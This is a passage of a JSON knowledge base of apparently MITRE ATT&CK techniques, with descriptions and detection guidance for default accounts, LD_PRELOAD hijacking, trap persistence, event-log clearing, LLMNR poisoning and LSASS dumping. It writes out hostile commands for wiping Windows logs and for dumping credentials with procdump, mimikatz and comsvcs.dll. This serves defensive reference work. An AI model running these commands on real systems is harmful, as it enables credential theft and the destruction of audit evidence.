      "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)\n\nDefault accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account\u2019s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1078.001",
      "stix_id": "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d",
      "created": "2020-03-13T20:15:31.974000+00:00",
      "modified": "2025-04-15T19:58:35.610000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Linux",
        "macOS",
        "Containers",
        "Network Devices",
        "Office Suite",
        "Identity Provider",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "User Account: User Account Authentication"
      ],
      "defense_bypassed": [],
      "detection": "Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately."
    },
    "T1547.003": {
      "id": "T1547.003",
      "name": "Time Providers",
      "description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.003",
      "stix_id": "attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc",
      "created": "2020-01-24T15:51:52.317000+00:00",
      "modified": "2025-04-15T19:58:35.700000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Modification",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Baseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code> as well as execution of the W32tm.exe utility.(Citation: Microsoft W32Time May 2017) There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk.(Citation: Github W32Time Oct 2017)\n\nThe Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers.(Citation: TechNet Autoruns)"
    },
    "T1546.005": {
      "id": "T1546.005",
      "name": "Trap",
      "description": "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.005",
      "stix_id": "attack-pattern--63220765-d418-44de-8fae-694b3912317d",
      "created": "2020-01-24T14:17:43.906000+00:00",
      "modified": "2025-04-25T14:46:52.100000+00:00",
      "platforms": [
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts."
    },
    "T1574.006": {
      "id": "T1574.006",
      "name": "Dynamic Linker Hijacking",
      "description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library\u2019s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation: Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024)\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.006",
      "stix_id": "attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825",
      "created": "2020-03-13T20:09:59.569000+00:00",
      "modified": "2025-04-15T19:58:36.147000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Command: Command Execution",
        "Module: Module Load",
        "Process: Process Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for changes to environment variables and files associated with loading shared libraries such as <code>LD_PRELOAD</code> and <code>DYLD_INSERT_LIBRARIES</code>, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates."
    },
    "T1136.001": {
      "id": "T1136.001",
      "name": "Local Account",
      "description": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account.  In Linux, the `useradd` command can be used, while on macOS systems, the <code>dscl -create</code> command can be used. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>, to ESXi servers via `esxcli system account add`, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1136.001",
      "stix_id": "attack-pattern--635cbe30-392d-4e27-978e-66774357c762",
      "created": "2020-01-28T13:50:22.506000+00:00",
      "modified": "2025-04-15T19:58:36.237000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "Containers",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Creation",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for processes and command-line parameters associated with local account creation, such as <code>net user /add</code> , <code>useradd</code> , and <code>dscl -create</code> . Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary. For network infrastructure devices, collect AAA logging to monitor for account creations."
    },
    "T1674": {
      "id": "T1674",
      "name": "Input Injection",
      "description": "Adversaries may simulate keystrokes on a victim\u2019s computer by various means to perform any type of action on behalf of the user, such as launching the command interpreter using keyboard shortcuts,  typing an inline script to be executed, or interacting directly with a GUI-based application.  These actions can be preprogrammed into adversary tooling or executed through physical devices such as Human Interface Devices (HIDs).\n\nFor example, adversaries have used tooling that monitors the Windows message loop to detect when a user visits bank-specific URLs. If detected, the tool then simulates keystrokes to open the developer console or select the address bar, pastes malicious JavaScript from the clipboard, and executes it - enabling manipulation of content within the browser, such as replacing bank account numbers during transactions.(Citation: BleepingComputer BackSwap)(Citation: welivesecurity BackSwap)\n\nAdversaries have also used malicious USB devices to emulate keystrokes that launch PowerShell, leading to the download and execution of malware from adversary-controlled servers.(Citation: BleepingComputer USB)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1674",
      "stix_id": "attack-pattern--63e3d25c-d57d-407d-8e6a-2cecd71f90be",
      "created": "2025-03-27T18:14:06.330000+00:00",
      "modified": "2025-04-15T19:58:36.409000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Script: Script Execution",
        "Drive: Drive Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1092": {
      "id": "T1092",
      "name": "Communication Through Removable Media",
      "description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system.(Citation: ESET Sednit USBStealer 2014) Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1092",
      "stix_id": "attack-pattern--64196062-5210-42c3-9a02-563a0d1797ef",
      "created": "2017-05-31T21:31:09.379000+00:00",
      "modified": "2025-04-15T22:06:39.028000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Drive: Drive Creation",
        "Drive: Drive Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file access on removable media. Detect processes that execute when removable media is mounted."
    },
    "T1070.001": {
      "id": "T1070.001",
      "name": "Clear Windows Event Logs",
      "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1070.001",
      "stix_id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
      "created": "2020-01-28T17:05:14.707000+00:00",
      "modified": "2025-04-15T19:58:36.700000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Deletion",
        "Process: OS API Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Deleting Windows event logs (via native binaries (Citation: Microsoft wevtutil Oct 2017), API functions (Citation: Microsoft EventLog.Clear), or [PowerShell](https://attack.mitre.org/techniques/T1059/001) (Citation: Microsoft Clear-EventLog)) may also generate an alterable event (Event ID 1102: \"The audit log was cleared\")."
    },
    "T1585.002": {
      "id": "T1585.002",
      "name": "Email Accounts",
      "description": "Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for follow-on purposes.(Citation: Free Trial PurpleUrchin)\n\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016) ",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1585.002",
      "stix_id": "attack-pattern--65013dd2-bc61-43e3-afb5-a14c4fa7437a",
      "created": "2020-10-01T01:09:53.217000+00:00",
      "modified": "2025-04-15T22:25:33.493000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566))."
    },
    "T1557.001": {
      "id": "T1557.001",
      "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
      "description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\u00a0\n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1557.001",
      "stix_id": "attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e",
      "created": "2020-02-11T19:08:51.677000+00:00",
      "modified": "2025-04-15T22:44:23.234000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Service: Service Creation",
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor <code>HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient</code> for changes to the \"EnableMulticast\" DWORD value. A value of \u201c0\u201d indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)\n\nMonitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.\n\nDeploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)"
    },
    "T1222": {
      "id": "T1222",
      "name": "File and Directory Permissions Modification",
      "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1222",
      "stix_id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-16T20:37:17.378000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Active Directory: Active Directory Object Modification",
        "Command: Command Execution",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)"
    },
    "T1003.001": {
      "id": "T1003.001",
      "name": "LSASS Memory",
      "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nSimilar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1003.001",
      "stix_id": "attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90",
      "created": "2020-02-11T18:41:44.783000+00:00",
      "modified": "2025-04-15T22:45:12.834000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Access",
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Creation",
        "Process: OS API Execution",
        "Logon Session: Logon Session Creation",
        "Command: Command Execution",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis."
    },
    "T1176.002": {
      "id": "T1176.002",
      "name": "IDE Extensions",
      "description": "Adversaries may abuse an integrated development environment (IDE) extension to establish persistent access to victim systems.(Citation: Mnemonic misuse visual studio) IDEs such as Visual Studio Code, IntelliJ IDEA, and Eclipse support extensions - software components that add features like code linting, auto-completion, task automation, or integration with tools like Git and Docker. A malicious extension can be installed through an extension marketplace (i.e., [Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001)) or side-loaded directly into the IDE.(Citation: Abramovsky VSCode Security)(Citation: Lakshmanan Visual Studio Marketplace)   \n\nIn addition to installing malicious extensions, adversaries may also leverage benign ones. For example, adversaries may establish persistent SSH tunnels via the use of the VSCode Remote SSH extension (i.e., [IDE Tunneling](https://attack.mitre.org/techniques/T1219/001)).  \n\nTrust is typically established through the installation process; once installed, the malicious extension is run every time that the IDE is launched. The extension can then be used to execute arbitrary code, establish a backdoor, mine cryptocurrency, or exfiltrate data.(Citation: ExtensionTotal VSCode Extensions  2025)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1176.002",
      "stix_id": "attack-pattern--66b34be7-6915-4b83-8d5a-b0f0592b5e41",
      "created": "2025-03-30T22:16:24.078000+00:00",
      "modified": "2025-04-23T12:40:46.664000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1595": {
      "id": "T1595",
      "name": "Active Scanning",
      "description": "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\n\nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1595",
      "stix_id": "attack-pattern--67073dde-d720-45ae-83da-b12d5e73ca3b",
      "created": "2020-10-02T16:53:16.526000+00:00",
      "modified": "2025-04-15T21:44:26.959000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1027.016": {
      "id": "T1027.016",
      "name": "Junk Code Insertion",
      "description": "Adversaries may use junk code / dead code to obfuscate a malware\u2019s functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined with [Compression](https://attack.mitre.org/techniques/T1027/015) or [Software Packing](https://attack.mitre.org/techniques/T1027/002).(Citation: ReasonLabs)(Citation: ReasonLabs Cyberpedia Junk Code)\n\nNo-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly language. They are commonly used as the 0x90 opcode. When NOPs are added to malware, the disassembler may show the NOP instructions, leading to the analyst needing to step through them.(Citation: ReasonLabs)\n\nThe use of junk / dead code insertion is distinct from [Binary Padding](https://attack.mitre.org/techniques/T1027/001) because the purpose is to obfuscate the functionality of the code, rather than simply to change the malware\u2019s signature.   ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.016",
      "stix_id": "attack-pattern--671cd17f-a765-48fd-adc4-dad1941b1ae3",
      "created": "2025-03-04T21:38:49.913000+00:00",
      "modified": "2025-04-15T19:58:37.495000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1548": {
      "id": "T1548",
      "name": "Abuse Elevation Control Mechanism",
      "description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1548",
      "stix_id": "attack-pattern--67720091-eee3-4d2d-ae16-8264567f6f5b",
      "created": "2020-01-30T13:58:14.373000+00:00",
      "modified": "2025-04-15T19:58:37.690000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "User Account: User Account Modification",
        "Command: Command Execution",
        "Process: OS API Execution",
        "File: File Modification",
        "Process: Process Metadata",
